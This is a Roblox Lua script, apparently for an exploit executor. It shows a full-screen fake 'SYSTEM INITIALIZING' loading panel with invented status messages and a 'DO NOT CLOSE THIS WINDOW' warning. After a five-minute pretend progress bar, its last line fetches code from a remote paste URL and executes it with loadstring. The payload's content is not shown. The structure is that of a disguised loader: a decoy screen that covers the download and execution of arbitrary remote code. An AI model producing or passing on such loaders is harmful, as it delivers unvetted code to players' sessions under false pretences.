local Players = game:GetService("Players")
local player = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = "Loading"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999999999
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.Parent = gethui and gethui() or game:GetService("CoreGui")

local frame = Instance.new("Frame")
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.Size = UDim2.new(0.55, 0, 0.5, 0)
frame.BackgroundColor3 = Color3.fromRGB(8, 12, 24)
frame.BorderSizePixel = 0
frame.ZIndex = 999999999
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(0, 200, 255)
stroke.Thickness = 1.5
stroke.Transparency = 0.3
stroke.Parent = frame

local topLine = Instance.new("Frame")
topLine.Size = UDim2.new(0.4, 0, 0, 2)
topLine.Position = UDim2.new(0.3, 0, 0, 0)
topLine.BackgroundColor3 = Color3.fromRGB(0, 220, 255)
topLine.BorderSizePixel = 0
topLine.ZIndex = 999999999
topLine.Parent = frame

local topLineCorner = Instance.new("UICorner")
topLineCorner.CornerRadius = UDim.new(1, 0)
topLineCorner.Parent = topLine

local cornerDecTL = Instance.new("Frame")
cornerDecTL.Size = UDim2.new(0, 18, 0, 18)
cornerDecTL.Position = UDim2.new(0, 14, 0, 14)
cornerDecTL.BackgroundTransparency = 1
cornerDecTL.BorderSizePixel = 0
cornerDecTL.ZIndex = 999999999
cornerDecTL.Parent = frame

local cornerStrokeTL = Instance.new("UIStroke")
cornerStrokeTL.Color = Color3.fromRGB(0, 200, 255)
cornerStrokeTL.Thickness = 2
cornerStrokeTL.Parent = cornerDecTL

local cornerDecBR = Instance.new("Frame")
cornerDecBR.Size = UDim2.new(0, 18, 0, 18)
cornerDecBR.Position = UDim2.new(1, -32, 1, -32)
cornerDecBR.BackgroundTransparency = 1
cornerDecBR.BorderSizePixel = 0
cornerDecBR.ZIndex = 999999999
cornerDecBR.Parent = frame

local cornerStrokeBR = Instance.new("UIStroke")
cornerStrokeBR.Color = Color3.fromRGB(0, 200, 255)
cornerStrokeBR.Thickness = 2
cornerStrokeBR.Parent = cornerDecBR

local iconBg = Instance.new("Frame")
iconBg.AnchorPoint = Vector2.new(0.5, 0)
iconBg.Size = UDim2.new(0, 48, 0, 48)
iconBg.Position = UDim2.new(0.5, 0, 0, 28)
iconBg.BackgroundColor3 = Color3.fromRGB(0, 40, 70)
iconBg.BorderSizePixel = 0
iconBg.ZIndex = 999999999
iconBg.Parent = frame

local iconCorner = Instance.new("UICorner")
iconCorner.CornerRadius = UDim.new(0, 12)
iconCorner.Parent = iconBg

local iconStroke = Instance.new("UIStroke")
iconStroke.Color = Color3.fromRGB(0, 180, 255)
iconStroke.Thickness = 1
iconStroke.Parent = iconBg

local iconLabel = Instance.new("TextLabel")
iconLabel.Size = UDim2.new(1, 0, 1, 0)
iconLabel.BackgroundTransparency = 1
iconLabel.TextColor3 = Color3.fromRGB(0, 210, 255)
iconLabel.TextScaled = true
iconLabel.Font = Enum.Font.GothamBold
iconLabel.Text = "⬡"
iconLabel.ZIndex = 999999999
iconLabel.Parent = iconBg

local title = Instance.new("TextLabel")
title.AnchorPoint = Vector2.new(0.5, 0)
title.Size = UDim2.new(0.8, 0, 0, 28)
title.Position = UDim2.new(0.5, 0, 0, 90)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(220, 240, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Text = "SYSTEM INITIALIZING"
title.ZIndex = 999999999
title.Parent = frame

local subtitle = Instance.new("TextLabel")
subtitle.AnchorPoint = Vector2.new(0.5, 0)
subtitle.Size = UDim2.new(0.8, 0, 0, 18)
subtitle.Position = UDim2.new(0.5, 0, 0, 126)
subtitle.BackgroundTransparency = 1
subtitle.TextColor3 = Color3.fromRGB(80, 150, 200)
subtitle.TextScaled = true
subtitle.Font = Enum.Font.Gotham
subtitle.Text = "Please wait while resources are loaded..."
subtitle.ZIndex = 999999999
subtitle.Parent = frame

local percentText = Instance.new("TextLabel")
percentText.AnchorPoint = Vector2.new(1, 0)
percentText.Size = UDim2.new(0.2, 0, 0, 18)
percentText.Position = UDim2.new(0.9, 0, 0, 178)
percentText.BackgroundTransparency = 1
percentText.TextColor3 = Color3.fromRGB(0, 210, 255)
percentText.TextScaled = true
percentText.Font = Enum.Font.GothamBold
percentText.Text = "0%"
percentText.TextXAlignment = Enum.TextXAlignment.Right
percentText.ZIndex = 999999999
percentText.Parent = frame

local statusText = Instance.new("TextLabel")
statusText.AnchorPoint = Vector2.new(0, 0)
statusText.Size = UDim2.new(0.6, 0, 0, 18)
statusText.Position = UDim2.new(0.1, 0, 0, 178)
statusText.BackgroundTransparency = 1
statusText.TextColor3 = Color3.fromRGB(60, 120, 160)
statusText.TextScaled = true
statusText.Font = Enum.Font.Code
statusText.Text = "> LOADING ASSETS"
statusText.TextXAlignment = Enum.TextXAlignment.Left
statusText.ZIndex = 999999999
statusText.Parent = frame

local barBg = Instance.new("Frame")
barBg.AnchorPoint = Vector2.new(0.5, 0)
barBg.Size = UDim2.new(0.8, 0, 0, 6)
barBg.Position = UDim2.new(0.5, 0, 0, 204)
barBg.BackgroundColor3 = Color3.fromRGB(20, 35, 55)
barBg.BorderSizePixel = 0
barBg.ZIndex = 999999999
barBg.Parent = frame

local barBgCorner = Instance.new("UICorner")
barBgCorner.CornerRadius = UDim.new(1, 0)
barBgCorner.Parent = barBg

local bar = Instance.new("Frame")
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(0, 190, 255)
bar.BorderSizePixel = 0
bar.ZIndex = 999999999
bar.Parent = barBg

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(1, 0)
barCorner.Parent = bar

local barGlow = Instance.new("Frame")
barGlow.AnchorPoint = Vector2.new(0, 0.5)
barGlow.Size = UDim2.new(1, 0, 0, 2)
barGlow.Position = UDim2.new(0, 0, 0.5, 0)
barGlow.BackgroundColor3 = Color3.fromRGB(180, 240, 255)
barGlow.BorderSizePixel = 0
barGlow.ZIndex = 999999999
barGlow.Parent = bar

local barGlowCorner = Instance.new("UICorner")
barGlowCorner.CornerRadius = UDim.new(1, 0)
barGlowCorner.Parent = barGlow

local divider = Instance.new("Frame")
divider.AnchorPoint = Vector2.new(0.5, 0)
divider.Size = UDim2.new(0.8, 0, 0, 1)
divider.Position = UDim2.new(0.5, 0, 0, 228)
divider.BackgroundColor3 = Color3.fromRGB(20, 50, 80)
divider.BorderSizePixel = 0
divider.ZIndex = 999999999
divider.Parent = frame

local hintText = Instance.new("TextLabel")
hintText.AnchorPoint = Vector2.new(0.5, 0)
hintText.Size = UDim2.new(0.8, 0, 0, 16)
hintText.Position = UDim2.new(0.5, 0, 0, 238)
hintText.BackgroundTransparency = 1
hintText.TextColor3 = Color3.fromRGB(45, 90, 130)
hintText.TextScaled = true
hintText.Font = Enum.Font.Gotham
hintText.Text = "DO NOT CLOSE THIS WINDOW"
hintText.ZIndex = 999999999
hintText.Parent = frame

local statusMessages = {
    [0]  = "> LOADING ASSETS",
    [20] = "> CONNECTING TO SERVER",
    [40] = "> SYNCING DATA",
    [60] = "> VERIFYING INTEGRITY",
    [80] = "> FINALIZING",
    [95] = "> ALMOST DONE",
}

local duration = 300
local startTime = tick()

while true do
    local elapsed = tick() - startTime
    local progress = math.clamp(elapsed / duration, 0, 1)
    local percent = math.floor(progress * 100)

    percentText.Text = percent .. "%"
    bar.Size = UDim2.new(progress, 0, 1, 0)

    for threshold, msg in pairs(statusMessages) do
        if percent >= threshold then
            statusText.Text = msg
        end
    end

    if progress >= 1 then
        break
    end

    task.wait(1)
end

percentText.Text = "100%"
statusText.Text = "> COMPLETE"
bar.Size = UDim2.new(1, 0, 1, 0)

loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/MOwBhr0iCwuyracL/raw"))()
